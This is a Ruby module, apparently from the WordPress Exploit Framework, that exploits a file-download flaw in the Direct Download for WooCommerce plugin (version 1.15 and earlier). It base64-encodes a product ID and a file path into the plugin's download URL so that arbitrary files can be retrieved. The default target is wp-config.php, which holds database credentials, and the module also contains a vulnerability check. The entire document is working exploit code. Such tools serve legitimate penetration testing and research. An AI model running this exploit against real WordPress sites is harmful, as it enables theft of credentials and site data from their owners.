class Wpxf::Auxiliary::DirectDownloadForWoocommerceFileDownload < Wpxf::Module
  include Wpxf::WordPress::FileDownload

  def initialize
    super

    update_info(
      name: 'Direct Download for WooCommerce <= 1.15 File Download',
      author: [
        'Diego Celdran Morell',           # Disclosure
        'Rob Carr <rob[at]rastating.com>' # WPXF module
      ],
      references: [
        ['WPVDB', '8724']
      ],
      date: 'Jan 17 2017'
    )

    register_options([
      IntegerOption.new(
        name: 'product_id',
        desc: 'A valid product ID that has direct download enabled',
        required: true
      )
    ])
  end

  def check
    url = normalize_uri(full_uri, 'direct-download', Utility::Text.rand_alpha(5))
    res = execute_get_request(url: url)
    return :vulnerable if res && !validate_content(res.body)
    :unknown
  end

  def product_id
    normalized_option_value('product_id')
  end

  def default_remote_file_path
    'wp-config.php'
  end

  def working_directory
    'the WordPress installation directory'
  end

  def download_ref
    Base64.strict_encode64("#{product_id}|#{remote_file}")
  end

  def downloader_url
    normalize_uri(full_uri, 'direct-download', download_ref)
  end

  def validate_content(content)
    content !~ /This product is not available for direct free download/
  end
end
